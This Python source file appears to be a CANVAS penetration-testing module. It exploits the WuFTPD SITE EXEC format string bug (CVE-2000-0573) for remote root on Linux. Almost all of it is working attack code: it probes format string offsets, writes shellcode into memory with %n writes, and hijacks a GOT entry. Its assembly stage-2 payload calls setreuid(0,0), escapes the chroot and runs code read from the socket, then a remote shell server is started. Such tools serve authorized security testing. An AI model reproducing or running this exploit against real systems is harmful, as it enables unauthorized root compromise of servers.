#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
if "." not in sys.path:
    sys.path.append(".")


import struct
import time

from exploitutils import *  
from tcpexploit import *


NAME="WuFTPD SITE EXEC Formatstring Bug"

DESCRIPTION="WuFTPD SITE EXEC Formatstring Bug"

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="wuftpd.org"
DOCUMENTATION["Date public"] = "22-06-2000"
DOCUMENTATION["CVE Name"] = "CVE-2000-0573"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0573"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["CERT Advisory"] = "http://www.cert.org/advisories/CA-2000-13.html"
DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/1387"
DOCUMENTATION["Repeatability"] = "Multiple tries"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux", "i386", "_all"], ["_FreeBSD"], ["_HP-UX"], ["_SCO"] ]

VERSION="0.1"

NOTES="""
Legacy support project; wuftpd <= 2.6.0 site exec formatstring bug

TODO:
    - add BSD
    - add Solaris
"""

TESTBEDS="""
vmware: Red Hat 7.0 wuftpd 2.6.0
"""

# are we cmdline
cmdline=0
# target types
UNDEFINED = 0
LINUX     = 1
BSD       = 2
SOLARIS   = 3

targets = {
    0 : ["Auto-detect version N/A", UNDEFINED],
    1 : ["Linux wuftpd <= 2.6.0", LINUX],
          }

class wuftpd:
    def __init__(self):
        self.ftp = None
        self.verbose = 0
        self.badchars = "\x00%\n"
        return

    def connect(self, t_host):
        s = self.gettcpsock() 
        try:
            s.connect((t_host, 21))
        except:
            return 0
        return s
    
    def ftpLogin(self, host, user, pw):
        # XXX check retval ...
        s = self.connect(host)
        from libs.wuftplib import FTP
        ftp = FTP(host, s)
        ftp.login(user, pw)
        return ftp
    
    def setupSession(self, host, user, pw, verbose=1):
        if verbose:
            self.log("Logging in (%s:%s@%s) ..."%(user, pw, host))
        for i in range(0, 2):
            try:
                self.ftp = self.ftpLogin(host, user, pw)
            except:
                self.log("Login retry ...")
                continue
            break

        if self.ftp == None:
            self.log("Failed to login")
            self.raiseError("fatal")
            
        if self.verbose:
            self.ftp.set_debuglevel(1)
        return 1
    
    def ffEscape(self, string):
        esc = ""
        for i in range(0, len(string)):
            if string[i] == "\xff":
                if self.verbose:
                    self.log( "Escaping ff byte...")
                esc += "\xff"
            esc += string[i]
        return esc
    
    def sane(self, badchars, address):
        sane = struct.pack("<L", address)
        for c in badchars:
            if c == sane[0]:
                return 0
            elif c == sane[1]:
                return 0
            elif c == sane[2]:
                return 0
            elif c == sane[3]:
                return 0
        return 1
    
class linuxWuftpd(wuftpd):
    def __init__(self):
        wuftpd.__init__(self)
        self.dpa = 0
        self.align = 0
        self.owned = 0
        return
    
    def findDpaLinux(self, startrange=200, endrange=1230):
        found = 0
        dpa = startrange
        align = 0
        ftp = self.ftp

        while not found and dpa < endrange:
            if self.state==self.HALT:
                self.log("Halted!")
                self.setInfo("%s - (halted)"%NAME)
                break 
            self.log("Finding DPA: %s"%dpa)
            CMD = ""
            CMD += "SITE EXEC 0 "
            CMD += "P"*align
            CMD += "AAAA"
            CMD += "%" + "%d"%dpa + "$x"
            #if self.ha
            if self.verbose:
                self.log( "command: %s"%CMD)

            try:
                reply = ftp.sendcmd(CMD)
                #sys.stderr.write("X")
            except:
                time.sleep(0.5)
                dpa+=1
                continue

            if reply.count("41414141"):
                found = 1
                continue
            elif reply.count("414141"):
                if align:
                    align = 0
                else:
                    align = 3
                dpa += 1
                continue
            elif reply.count("4141"):
                if align:
                    align = 0
                else:
                    align = 2
                dpa += 1
                continue
            elif reply.count("41"):
                if align:
                    align = 0
                else:
                    align = 1
                dpa += 1
                continue
                
            if align:
                align = 0
            dpa += 1
            
        if found:
            self.log("Found direct parameter offset %d with align %d"%(dpa, align))
            return [dpa, align]
        self.log("Could not get correct DPA")
        self.raiseError("fatal")
        # not reached(tm)
        return [0, 0]
    
    def write4Linux(self, what, where, check=0, pedantic=0):
        if pedantic:
            if not self.sane(self.badchars, what):
                #self.log("Skipping bad address (0x%.8x)"%what)
                return 1
            if not self.sane(self.badchars, where):
                #self.log("Skipping bad address (0x%.8x)"%where)
                return 1
        dpa = self.dpa
        align = self.align
        ftp = self.ftp
        CMD = ""
        CMD += "SITE EXEC 0 "
        CMD += "P"*align
        # writelocs
        CMD += struct.pack("<L", where + 0)
        CMD += struct.pack("<L", where + 1)
        CMD += struct.pack("<L", where + 2)
        CMD += struct.pack("<L", where + 3)
        pre = 16 + 2 + align
        writeA = (what & 0x000000FFL)
        if writeA < pre:
            self.log("LSB of what too small for pre adjust")
            self.raiseError("fatal")
        writeB = (what & 0x0000FF00L) >> 8
        writeB = writeB & 0xFF
        writeB += 0x100
        writeC = (what & 0x00FF0000L) >> 16
        writeC = writeC & 0xFF
        writeC += 0x200
        writeD = (what & 0xFF000000L) >> 24
        writeD = writeD & 0xFF
        writeD += 0x300
        if self.verbose:
            print "Write vals: %.8x %.8x %.8x %.8x"%(writeA, writeB, writeC, writeD)
            print "Write locs: %.8x %.8x %.8x %.8x"%(where, where+1, where+2, where+3)
        CMD += "%%.%dx%%%d$n"%(writeA-pre, dpa)
        CMD += "%%.%dx%%%d$n"%(writeB-writeA, dpa + 1)
        CMD += "%%.%dx%%%d$n"%(writeC-writeB, dpa + 2)
        CMD += "%%.%dx%%%d$n"%(writeD-writeC, dpa + 3)
        CMD = self.ffEscape(CMD)
        if self.verbose:
            self.log("write4(0x%.8x, 0x%.8x)"%(what, where))
        try:
            reply = ftp.sendcmd(CMD)
        except:
            return 0
        if check:
            if reply.count("Z"):
                self.log("Owned ! (where: 0x%.8x)"%where)
                self.owned = 1
        return 1
        
    def pokeStage1Linux(self, codeloc):
        """
        Little stage 1 read, I'd mosdef it but
        it's more convenient for me to do it 
        static right now. Reads 0xfefe bytes max
        
          1 .data
          2 .globl start
          3 .globl end
          4 
          5 start:
          6 xorl %eax,%eax
          7 xorl %ebx,%ebx
          8 movw $0xfefe,%ax
          9 subl %eax,%esp
         10 pushl %esp
         11 popl %ecx
         12 movl %eax,%edx
         13 movl %ebx,%eax
         14 movb $03,%al
         15 int $0x80
         16 jmp *%esp
         17 end:
        
        Hex:
            
          1. "\x31\xc0\x31\xdb"
          2. "\x66\xb8\xfe\xfe"
          3. "\x29\xc4\x54\x59"
          4. "\x89\xc2\x89\xd8"
          5. "\xb0\x03\xcd\x80"
          6. "\xff\xe4\x90\x90";

        """
        self.log("Poking stage1 @ 0x%.8x"%codeloc)

        if not self.write4Linux(0xdb31c031L, codeloc):
            self.log("Remote crashed in poke :(")
            self.raiseError("fatal")
        if not self.write4Linux(0xfefeb866L, codeloc + 4):
            self.log("Remote crashed in poke :(")
            self.raiseError("fatal")
        if not self.write4Linux(0x5954c429L, codeloc + 8):
            self.log("Remote crashed in poke :(")
            self.raiseError("fatal")
        if not self.write4Linux(0xd889c289L, codeloc + 12):
            self.log("Remote crashed in poke :(")
            self.raiseError("fatal")
        if not self.write4Linux(0x80cd03b0L, codeloc + 16):
            self.log("Remote crashed in poke :(")
            self.raiseError("fatal")
        if not self.write4Linux(0x9090e4ffL, codeloc + 20):
            self.log("Remote crashed in poke :(")
            self.raiseError("fatal")
        return 1
    
    def createStage2Linux(self):
        code = """
        // setreuid(0,0)
        xorl %eax,%eax
        xorl %ebx,%ebx
        xorl %ecx,%ecx
        movb $70,%al
        int $0x80

        // mkdir o..
        xorl %eax,%eax
        // nul terminate
        pushl %eax
        pushl $0x2E2E6F6F
        movl %esp,%ebx
        // point to o..
        incl %ebx
        pushl %ebx
        xorl %ecx,%ecx
        movb $39,%al
        int $0x80

        // chroot(o..)
        popl %ebx
        pushl %ebx
        xorl %eax,%eax
        movb $61,%al
        int $0x80

        // loop chdir(..)
        popl %ebx
        // point to ..
        incl %ebx
        pushl %ebx
        xorl %ecx,%ecx
        movb $255,%cl

chdir_loop:

        popl %ebx
        pushl %ebx
        xorl %eax,%eax
        movb $12,%al
        int $0x80

        loop chdir_loop

        // chroot(.)

        popl %ebx
        // point to .
        incl %ebx
        xorl %eax,%eax
        movb $61,%al
        int $0x80

        // we just use stdin as our * fd
        xorl %esi,%esi
        
        // %esi has our fd 
        xorl %eax,%eax
        xorl %edx,%edx
        xorl %edi,%edi
        // read the first 4 bytes..len value
        movb $4,%dl
        movl %esp,%ecx
        movl %esi,%ebx
        movb $3,%al
        int $0x80
        cmpb $0xff,%ah
        je exit
        movl (%esp),%edi
        // our total len is in %edi..let the games begin
        // make room
        subl %edi,%esp
        // save original %esp
        movl %esp,%esi
readexecloop:
        xorl %eax,%eax
        movl %edi,%edx
        movl %esp,%ecx
        movb $3,%al
        int $0x80
        cmpb $0xff,%ah
        je exit
        cmpl %edi,%eax
        je execute
        subl %eax,%edi
        addl %eax,%esp
        jmp readexecloop
        execute:
        // jmp to execute .. ebx has the fd
        // reset stackpointer to prevent instruction heckups
        movl %esi,%esp
        jmp *%esp
                
        exit:
        xorl %ebx,%ebx
        xorl %eax,%eax
        incb %al
        int $0x80
        """
        from MOSDEF import mosdef
        self.log("Assembling stage2 shellcode ...")
        stage2 = mosdef.assemble(code, "X86")
        self.log("Code len: %d bytes"%len(stage2))
        return stage2
    
    def pokeCheckCodeLinux(self, codeloc):
        # little dump code we use to check success
        # dumps a trigger char on the socket to confirm success
        # this char is not %4 so we don't have to exclude it
        """
        This has some wackyness due to bad byte avoiding.
        
        1. "\x68\x9a\x40\x40"
        2. "\x40\x81\x2c\x24"
        3. "\x40\x40\x40\x40"
        4. "\x31\xc0\x31\xdb"
        5. "\x31\xd2\x89\xe1"
        6. "\x42\x40\x40\x40"
        7. "\x40\xcd\x80\x31"
        8. "\xc0\x40\xcd\x80";

        """
        self.log("Poking checkcode @ 0x%.8x"%codeloc)

        if not self.write4Linux(0x40409a68L, codeloc):
            self.log("Remote crashed in poke :(")
            self.raiseError("fatal")
        if not self.write4Linux(0x242c8140L, codeloc + 4):
            self.log("Remote crashed in poke :(")
            self.raiseError("fatal")
        if not self.write4Linux(0x40404040L, codeloc + 8):
            self.log("Remote crashed in poke :(")
            self.raiseError("fatal")
        if not self.write4Linux(0xdb31c031L, codeloc + 12):
            self.log("Remote crashed in poke :(")
            self.raiseError("fatal")
        if not self.write4Linux(0xe189d231L, codeloc + 16):
            self.log("Remote crashed in poke :(")
            self.raiseError("fatal")
        if not self.write4Linux(0x40404042L, codeloc + 20):
            self.log("Remote crashed in poke :(")
            self.raiseError("fatal")
        if not self.write4Linux(0x3180cd40L, codeloc + 24):
            self.log("Remote crashed in poke :(")
            self.raiseError("fatal")
        if not self.write4Linux(0x80cd40c0L, codeloc + 28):
            self.log("Remote crashed in poke :(")
            self.raiseError("fatal")

        return 1
    
    def ownItLinux(self, codeloc, retloc):
        self.pokeStage1Linux(codeloc)
        # printf GOT jump slot for now
        if not self.write4Linux(codeloc, retloc):
            self.log("Remote stalled :)")
        stage2 = self.createStage2Linux()
        s = self.ftp.sock
        s.send(stage2 + "\n")
        time.sleep(1)
        #telnetshell = Telnet()
        #telnetshell.sock = s
        #if cmdline:
        #    telnetshell.write("uname -a; id\n")
        #    telnetshell.interact()
        #    return None
        return s
    
    def checkItLinux(self, codeloc, retloc):
        try:
            self.pokeCheckCodeLinux(codeloc)
        except:
            self.log("Could not poke checkcode")
            self.raiseError("fatal")
        if not self.write4Linux(codeloc, retloc, check=1):
            return 0
        return 1
            
    def attackLinux(self, host, user, pw):
        try:
            self.setupSession(host, user, pw)
        except:
            self.log("Could not setup ftp session")
            self.raiseError("fatal")
        
        #print "Attach!"
        #sys.stdin.read(1)
        
        self.log("Locating DPA offset ...")
        try:
            ret = self.findDpaLinux()
        except:
            self.log("Trouble finding DPA offset")
            self.raiseError("fatal")
            return 0
        
        self.dpa = ret[0]
        self.align = ret[1]
        
        self.setProgress(25)
        
        # now we start hunting for start of .data
        self.log("Trying to locate start of .data ...")
        text = 0x08048040
        while not self.write4Linux(0x41424344L, text):
            if self.state==self.HALT:
                self.log("Halted while trying to write4!")
                return 0 
            if self.verbose:
                self.log("Failure on write4 to: 0x%.8x"%text)
            try:
                self.setupSession(host, user, pw, verbose=0)
            except:
                self.log("Could not setup ftp session")
                self.raiseError("fatal")
            text += 0x1000
        
        data = text
        self.log("Possible (close enough) start of .data found at: 0x%.8x"%data)
        
        # this is where we poke our shellcode
        codeloc = 0xbffff040L
        
        self.setProgress(50)
        
        # now we start hunting for interesting locations
        # failure is interesting, but check for sanity of address
        self.log("Probing for interesting failures ...")
        lastdata = data
        pattern = 0
        while not self.owned and data < 0x08070000L:
            if self.state==self.HALT:
                self.log("Halted while trying to attack WuFTPD")
                return 0
            while self.write4Linux(0x41424344L, data, check=0, pedantic=1):
                sys.stderr.write("o")
                data += 4
            # interesting failure !
            self.ftp.close()
            # if you want the best succesrate, skip this
            # however this pattern matching greatly speeds
            # up the exploit, based on practical pattern bruting
            # based on noticing a pattern of a series of 0x100 offset
            # failures followed later by a series of 0x10 offset failures
            # we use a somewhat loose approach at landing into non
            # pattern failures, which increases our chances of reaching
            # the GOT faster
            if not (data-lastdata)%0x100 or not (data-lastdata)%0x10:
                """
                if pattern < 2:
                    pattern += 1
                if pattern == 2:
                    print "Got a 0x100/0x10 failure pattern !"
                    pattern = 0
                """
                # this speeds it up, without being too exclusive
                if not (data-lastdata)%0x100:
                    data += 0x1000
                elif not (data-lastdata)%0x10:
                    data += 0x100
                try:
                    self.setupSession(host, user, pw, verbose=0)
                except:
                    self.log("Could not setup ftp session")
                    self.raiseError("fatal")
                continue
            self.log("Interesting failure @ 0x%.8x"%data)
            lastdata = data
            try:
                self.setupSession(host, user, pw, verbose=0)
            except:
                self.log("Could not setup ftp session")
                self.raiseError("fatal")
            self.checkItLinux(codeloc, data)
            if not self.owned:
                data += 4
            
        self.setProgress(75)
        
        if self.owned:
            self.ftp.close()
            self.ftp = None
            try:
                self.setupSession(host, user, pw, verbose=0)
            except:
                self.log("Could not setup ftp session")
                self.raiseError("fatal")
                
            #print "Attach now !"
            #sys.stdin.read(1)
            
            try:
                s = self.ownItLinux(codeloc, data)
            except:
                self.log("Trouble in final exploit attempt")
                self.raiseError("fatal")
            node = None
            try:
                from linuxNode import linuxNode
                node=linuxNode()
                node.parentnode=self.socknode
                import linuxMosdefShellServer
                linuxMosdefShellServer.linuxshellserver(s,node,logfunction=self.logfunction)
                self.log("Calling startup for MOSDEF shell server")
                node.startup()
                self.setInfo("%s attacking %s:%d (Succeeded!)"%(NAME,self.host,self.port))            
            except self.error, msg:
                self.log("Error making shell listener")
                self.raiseError("fatal")
            self.setProgress(100)
            return node
        else:
            self.log("Did not find suitable retloc")
            self.raiseError("fatal")
        return None

class theexploit(tcpexploit, linuxWuftpd):
    def __init__(self):
        tcpexploit.__init__(self)
        linuxWuftpd.__init__(self)
        self.info = ""
        self.type = UNDEFINED
        self.host = ""
        self.port = 21
        self.user = "anonymous"
        self.password = "noone@nowhere.none"
        self.version = 0
        self.covertness = 0
        # porting to 5.0
        self.supportedNodeArgs = [["LocalNode", "linuxNode"]]
        self.name = NAME
        return
    
    def neededListenerTypes(self):
        return []
    
    def test(self):
        # keep autohack happy for now untill I dig up my old target box
        return 0
        # init arguments
        self.host = self.target.interface
        self.port = int(self.argsDict["port"])
        self.user = self.argsDict["user"]
        self.password = self.argsDict["password"]
        try:
            self.setupSession(self.host, self.user, self.password)
        except:
            self.log("Could not setup ftp session, fatal")
            return 0
        if not self.write4Linux(0x41424344L, 0x01020304L):
            self.log("Service failure, appears vulnerable")
            return 1
        self.log("Service survived, not vulnerable")
        self.ftp.close()
        return 0
    
    def run(self):
        # init arguments
        self.host = self.target.interface
        if "port" in self.argsDict:
            self.port = int(self.argsDict["port"])
        if "user" in self.argsDict and "password" in self.argsDict:
            self.user = self.argsDict["user"]
            self.password = self.argsDict["password"]

        self.socknode = self.argsDict["passednodes"][0]
        
        print "host: %s user: %s pw: %s"%(self.host, self.user, self.password)

        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port))
        if self.version == 0:
            self.log("Auto-detect not available")
            return 0
        self.info, self.type = targets[self.version]
        if self.type == LINUX:
            try:
                #print "user %s pass %s host %s"%(self.user, self.password, self.host) 
                shell = self.attackLinux(self.host, self.user, self.password)
                self.setInfo("%s attacked %s:%d (succeeded!)" % (NAME, self.host, self.port))
                return shell
            except:
                self.setInfo("%s attacked %s:%d (failed)" % (NAME, self.host, self.port))
                self.log("Final exception in attack class")
                return 0
        else:
            self.log("Unhandled target type: %d"% self.type)
        return 0

    def displayVersions(self):   
        i = 0
        print "Available versions:"
        for listline in targets.values():
            print "\t%d : %s"% (i, listline[0])
            i = i + 1
        return

    def usage(self):
        print "Usage: %s -v version -t host [ -O user:username -O password:pass ] [ -T (test) ]"% sys.argv[0]
        self.displayVersions()

if __name__== '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0, 1, None]:
        ret.interact()

